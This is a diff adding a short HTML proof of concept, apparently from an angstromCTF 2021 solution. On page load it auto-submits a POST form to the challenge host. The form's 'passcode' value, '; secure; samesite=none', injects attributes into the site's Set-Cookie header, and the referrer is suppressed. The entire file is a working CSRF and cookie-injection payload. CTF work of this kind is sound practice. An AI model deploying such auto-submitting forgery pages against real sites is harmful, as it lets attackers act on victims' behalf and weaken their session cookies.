@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="referrer" content="no-referrer">
+    <title>Set Cookie domains</title>
+</head>
+<body>
+    <form action="https://jason.2021.chall.actf.co/passcode" id="csrf-form" method="POST">
+        <input name="passcode" value="; secure; samesite=none">
+    </form>
+    <script>document.getElementById("csrf-form").submit()</script>
+</body>
+</html>
+
+<!-- csrf_to_setcookie.html  -->
